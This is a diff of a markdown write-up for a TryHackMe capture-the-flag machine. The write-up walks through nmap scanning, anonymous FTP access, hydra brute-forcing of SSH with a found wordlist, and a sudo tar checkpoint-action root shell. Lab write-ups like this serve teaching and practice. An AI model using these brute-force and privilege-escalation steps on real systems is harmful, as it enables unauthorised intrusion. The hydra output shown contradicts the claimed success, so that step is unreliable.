@@ -7,7 +7,8 @@ tryhackme
 ## NMAP SCAN
 *here is a nmap scan of the machine*
 nmap command :- nmap -A http:// <IP_Address>
-___
+
+```
 Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
@@ -48,16 +49,17 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds
-___
- 
+```
+
 *we can see in the nmap result that ftp and ssh is open* 
 *firstly im going to try ftp into the machine*
 
 ## FTP results
-*The FTP is accessible try login with anonymous.
-command :- ftp <IP_Address> 
-when asked for user enter anonymous*
+- The FTP is accessible try login with anonymous.
+- command :- ftp <IP_Address> 
+- when asked for user enter anonymous
 
+```
 ftp> ls -la
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -67,22 +69,23 @@ drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
 -rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
 226 Directory send OK.
 ftp>
-
+```
 *get the files locks.txt and task.txt they are needed in further enumeration*
 ___
 *task.txt*
 in task.txt we found a user (lin)
 ___
+```
 $ cat task.txt
-
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
 
 -lin
+```
 ___
 locks.txt
 this look's like a wordlist so we will use it for bruteforce
-
+```
 *$ cat locks.txt* 
 - rEddrAGON
 - ReDdr4g0nSynd!cat3
@@ -111,13 +114,14 @@ this look's like a wordlist so we will use it for bruteforce
 - r3ddr@g0N
 - ReDSynd1ca7e
 
+```
 ---
 
 ## HYDRA
 **trying to brute force ssh using hydra**
 now we have the user name and we will use the wordlist locks.txt to brute force
 command :- hydra -l lin -P locks.txt  <IP_Address> ssh
-
+```
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 21:45:38
@@ -125,18 +129,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 21:45:
 [DATA] attacking ftp://10.10.0.198:21/
 1 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-22 21:45:39
-
-we found the password and login via ssh
-we see the user flag 
-we just cat the user flag 
-user.txt - THM{userflag}
+```
+- we found the password and login via ssh
+  we see the user flag 
+- we just cat the user flag 
+- user.txt - THM{userflag}
 ___
 
 ### Priv Sec
 now we need to escalate our privilege
 we can exploit  lin's sudo privilege
 command :- sudo -l
-___
+```
 lin@bountyhacker:~$ sudo -l
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
@@ -145,20 +149,20 @@ Matching Defaults entries for lin on bountyhacker:
 
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
-___
+```
 
 *i searched more on tar sudo privilege escaltion and found this*
 
 
 just run the following command 
-command :- sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+- command :- sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ![68747470733a2f2f692e696d6775722e636f6d2f41397a70647a6e2e706e67](https://user-images.githubusercontent.com/80511498/147251386-5d178b8c-1a21-4590-90d1-fde988fe1ecc.png)
 
 
-now we have a root access you can see by typing :- sudo -l
+- now we have a root access you can see by typing :- sudo -l
 ![68747470733a2f2f692e696d6775722e636f6d2f633845557361732e706e67](https://user-images.githubusercontent.com/80511498/147251202-77aa7dce-db3a-4829-a758-fba7623e3173.png)
 
-cd into /root to get to the root flag
+- cd into /root to get to the root flag
 ___
 
